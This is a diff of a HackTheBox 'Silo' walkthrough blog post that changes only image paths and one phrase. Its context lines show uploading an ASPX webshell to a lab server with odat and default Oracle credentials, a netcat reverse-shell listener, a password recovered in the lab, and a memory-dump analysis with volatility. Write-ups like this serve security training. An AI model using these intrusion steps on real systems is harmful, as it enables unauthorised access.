@@ -4,7 +4,7 @@ title: Hackthebox Silo Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://inar1.github.io/public/images/2019-11-07/silo-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-11-06/silo-badge.png)
 # Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
 To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
@@ -150,7 +150,7 @@ root@kali:~# odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --
 [1] (10.10.10.82:1521): Put the /usr/share/webshells/aspx/cmdasp.aspx local file in the C:\inetpub\wwwroot path (named cmdasp.aspx) of the 10.10.10.82 server
 [+] The /usr/share/webshells/aspx/cmdasp.aspx local file was put in the remote C:\inetpub\wwwroot path (named cmdasp.aspx)
 {% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-11-07/2019-11-06-18-39-38.png)
+![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-18-39-38.png)
 
 To launch a netcat listener to receive a reverse shell.
 {% highlight shell %}
@@ -232,12 +232,12 @@ After that, download the file "SILO-20180105-221806.zip".
 {% highlight shell %}
 £%Hm8646uC$
 {% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-11-07/2019-11-06-19-06-31.png)
-![placeholder](https://inar1.github.io/public/images/2019-11-07/2019-11-06-19-08-14.png)
+![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-19-06-31.png)
+![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-19-08-14.png)
 
 By unzip, we can get a file which contains memory dump.<br>
 We can use "<a href="https://github.com/volatilityfoundation/volatility">volatility</a>" which is installed by default to do the investigation.<br>
-At first, dump the general information of "SILO-20180105-221806.dmp".
+At first, dump the profile of "SILO-20180105-221806.dmp".
 {% highlight shell %}
 root@kali:~# volatility kdbgscan -f SILO-20180105-221806.dmp
 Volatility Foundation Volatility Framework 2.6
